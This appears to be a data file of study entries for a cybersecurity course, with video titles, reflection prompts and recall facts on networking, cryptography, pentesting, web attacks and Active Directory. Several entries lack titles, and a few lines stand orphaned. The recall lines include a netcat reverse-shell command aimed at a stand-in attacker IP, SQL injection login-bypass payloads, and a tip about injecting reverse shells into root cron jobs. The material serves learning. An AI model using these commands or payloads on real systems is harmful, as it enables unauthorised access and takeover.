videos.title: Computer Networks: Crash Course Computer Science #28
videos.why: The one video that makes the internet stop being magic. Layers, explained properly.
videos.prompt: In my own words, the layers of a network stack are...
recallKeys: Ethernet computers listen to a shared cable and only process data when their unique MAC address appears in the header.
When collisions occur, computers use exponential backoff—doubling their wait time after each repeated collision to reduce congestion.
Packet switching chops data into small packets that travel flexible routes, making the internet decentralized and fault-tolerant.

videos.title: How a DNS Server (Domain Name System) works.
videos.why: DNS is reconnaissance target #1 and the engine behind half of all phishing. Know it cold.
videos.prompt: In my own words, what a DNS server actually does is...
recallKeys: DNS resolves human-readable domain names into IP addresses so browsers can reach web servers using numbers computers understand.
DNS resolution chains through local cache, ISP resolver, root server, TLD server, and finally the authoritative name server.
Once a resolver receives an IP address, it stores the result in cache memory to avoid repeating the full lookup chain for future queries.

videos.title: TCP-3 Way Handshake Explained
videos.why: Every scan, every shell, every packet you will ever send rides on this handshake. Security-framed.
videos.prompt: In my own words, the three-way handshake works by...
recallKeys: The TCP three-way handshake starts with a client SYN, followed by a server SYN-ACK, and completed by a client ACK.
An nmap TCP connect scan completes the handshake to check open ports, then sends an RST to reset the connection.
UDP is connectionless with no handshake; an open port returns no response, while a closed port triggers an ICMP unreachable message.

videos.title: What is Hashing? Hash Functions Explained Simply
videos.why: Hashing vs encryption is the most confused pair in security. Two minutes, permanent.
videos.prompt: In my own words, the difference between hashing and encryption is...
recallKeys: Hashing uses a mathematical function to convert input of any length into a fixed-size string of text.
No matter the input size, a hash produces a consistent-length array of numbers and letters.
The conversion from input text to hash output runs through a mathematical algorithm.

videos.title: Public Key Cryptography - Computerphile
videos.why: Why you can shout your public key in a crowd and still keep a secret.
videos.prompt: In my own words, public key cryptography works because...
recallKeys: In asymmetric encryption, anything encrypted with a public key can only be decrypted by the matching private key, and vice versa.
Encrypting with your private key proves authenticity: only you hold it, and anyone can verify the message with your public key.
You publish your public key widely and keep the private key secret, eliminating the need to exchange keys beforehand.

videos.title: SSL, TLS, HTTP, HTTPS Explained
videos.why: What the padlock actually proves - and what it does not prove.
videos.prompt: In my own words, the padlock in my browser proves... and does not prove...
recallKeys: Standard HTTP transmits all data as clear text across the internet, making passwords and credit card numbers vulnerable to interception.
SSL uses public key encryption and certificates: the server sends its certificate, the browser verifies it, then encrypted data flows.
TLS is SSL's successor, based on the same specs, and both authenticate endpoints while encrypting transmitted data.

videos.title: What is a Firewall?
videos.why: The 'filtered' port from my own scanme.nmap.org scan, explained.
videos.prompt: In my own words, a firewall decides what to do with a packet by...
recallKeys: A firewall filters incoming and outgoing network traffic using customizable rules called an access control list.
Host-based firewalls protect a single computer, while network-based firewalls protect entire networks at the network layer.
Firewall rules can filter by IP address, port number, domain name, protocol, program, or keyword.

videos.title: Linux File Permissions in 5 Minutes | MUST Know!
videos.why: My tracker line 12, on video. Watch AFTER doing the lab, not before.
videos.prompt: In my own words, chmod 754 means the owner can..., the group can..., others can...
recallKeys: Every Linux file and directory has three permission groups: owner, group, and others, each with read, write, and execute bits.
Use chown to change file ownership and chmod with octal notation where read equals 4, write equals 2, and execute equals 1.
A baseline file permission of 644 allows owner read-write and everyone else read-only; directories should use 755.

videos.title: Nmap Tutorial to find Network Vulnerabilities
videos.why: nmap walkthrough - the tool already installed on my Mac.
videos.prompt: In my own words, an open vs closed vs filtered port means...
recallKeys: Nmap scans entire networks to discover live hosts, open ports, running services, and OS versions in seconds.
The command nmap -sP network performs a ping sweep that identifies every active host across a subnet.
Nmap with -sV and -O flags reveals detailed service versions and operating system fingerprints for vulnerability research.

videos.title: Simple Penetration Testing Tutorial for Beginners!

videos.prompt: In my own words, the phases of a penetration test in order are...
recallKeys: Nmap with -sV and -O flags enumerates open ports, service versions, and the operating system of a target device.
Dirb brute-forces hidden web directories to reveal attack surfaces like /cgi-bin/ for further exploitation.
Metasploit delivers reverse shell payloads through vulnerable CGI-bin services, bypassing inbound firewall restrictions.

videos.title: how to get remote access to your hacking targets // reverse shells with netcat (Windows and Linux!!)
videos.why: Why a reverse shell beats a bind shell. The payoff of every web bug I will find.
videos.prompt: In my own words, a reverse shell beats a bind shell because...
recallKeys: A reverse shell bypasses firewalls by having the target connect outbound to the attacker instead of the attacker connecting inbound.
The attacker listens with nc -lvnp port; the target connects using nc -e /bin/bash attacker_ip port.
Netcat reverse shells work on both Linux and Windows; PowerShell provides a built-in shell delivery method on Windows.

videos.title: How Hackers Gain Root Access | Linux Privilege Escalation
videos.why: User to root - the phase where CTF boxes are actually won.
videos.prompt: In my own words, the first three things I check for Linux privesc are...
recallKeys: sudo -l reveals which commands a user can run as root; GTFO Bins lists one-liner exploits for vulnerable binaries like find.
SUID binaries execute with their owner's permissions regardless of who runs them, enabling privilege escalation to root.
Compromising writable cron jobs running as root lets you inject reverse shells or arbitrary commands for persistent escalation.

videos.title: SQL Injections are scary!! (hacking tutorial for beginners)
videos.why: The classic. Module 6 target #1, demonstrated live.
videos.prompt: In my own words, SQL injection works by...
recallKeys: Inserting a single quote into a login field and receiving a SQL syntax error confirms the application is vulnerable to injection.
The payload ' OR '1'='1 exploits SQL operator precedence to bypass authentication by making the WHERE clause always true.
Using admin'-- as a username comments out the password check, granting access with only a known username and no password.

videos.title: Cross-Site Scripting (XSS) Explained

videos.prompt: In my own words, cross-site scripting attacks the user by...
recallKeys: Cross-site scripting is a JavaScript injection technique that executes attacker-controlled code in a victim's browser context.
Reflected XSS echoes user input directly in the HTTP response as HTML, causing the browser to execute any injected script tags.
Stored XSS persists malicious payloads in a database so every user who views the affected page gets automatically exploited.

videos.prompt: In my own words, broken access control / IDOR is... and the fix is...
recallKeys: Authentication verifies who you are; authorization and access control determine what actions and resources you are permitted.
Changing a user identifier in API requests exposes other users' private data when the server fails to verify ownership.
Directly browsing to admin URLs or switching user IDs in requests bypasses access controls to reveal privileged functionality.

videos.title: Running a Buffer Overflow Attack - Computerphile
videos.why: Memory, the stack, and the founding bug of exploitation. Watch before Module 11.
videos.prompt: In my own words, a buffer overflow lets an attacker control... because...
recallKeys: A function call pushes the return address onto the stack above local variables, so overflowing a buffer can redirect execution.
Functions like gets() accept unbounded input into fixed-size buffers with no length checks, enabling classic stack-based overflows.
Overwriting the saved return address to point at shellcode placed in the overflowed buffer grants arbitrary code execution.

videos.title: Active directory in a nutshell | How windows AD works in networking (2025)
videos.why: The thing that runs every corporate network on earth. Module 8 starts here.
videos.prompt: In my own words, Active Directory exists to solve...
recallKeys: Active Directory is a hierarchical database that centrally organizes and secures enterprise resources like users and servers.
AD's logical architecture has five building blocks: objects, domains, organizational units, trees, and forests in a namespace.
Domain controllers handle authentication requests while DNS resolves the nearest DC and the global catalog indexes forest-wide.

videos.title: MicroNugget: How Kerberos Works in Windows Active Directory | CBT Nuggets
videos.why: Authentication for AD, and the source of half of red-team tradecraft.
videos.prompt: In my own words, Kerberos proves identity using tickets by...
recallKeys: Kerberos never transmits the password across the network; it uses the password as a shared encryption key for the Authenticator.
The KDC issues a Ticket Granting Ticket encrypted with its own key, valid for 8 hours, so the client isn't re-authenticated every access.
Service tickets are encrypted with the target server's password, letting the server decrypt them without ever communicating with the KDC.

videos.title: Zero-day Vulnerabilities - CompTIA Security+ SY0-701 - 2.3

videos.prompt: In my own words, a zero-day is... and it is dangerous because...
recallKeys: A zero-day attack exploits a vulnerability unknown to the vendor, so no patch exists when exploitation begins.
Attackers work constantly to discover undisclosed vulnerabilities first, since they do not share findings with the software vendor.
Real-world examples include Chrome sandbox escapes, Microsoft Secure Boot bypasses, and Apple iOS arbitrary code execution.

videos.title: CVE and CVSS explained | Security Detail

videos.prompt: In my own words, CVE is... and CVSS measures...
recallKeys: The CVE database assigns identifiers to publicly known software flaws, while CVSS scores them 0 to 10 by severity.
CVSS scores exploitability, scope, and impact but doesn't measure organizational risk — that requires evaluating likelihood and consequence.
Open source software may have more published CVEs, but that transparency lets users compensate with knowledge unlike proprietary software.

Investigators geo-located the MH17 missile launcher by cross-referencing social media photos, dashcam footage, and Google Street View.
Free tools like Google Earth, Bing Maps, and WikiMapia let anyone verify intelligence claims without trusting governments blindly.

videos.prompt: In my own words, a prompt injection attack works by... and the defence is...

Mitigations include input filtering, least-privilege access, human-in-the-loop approval for critical actions, and RLHF training.
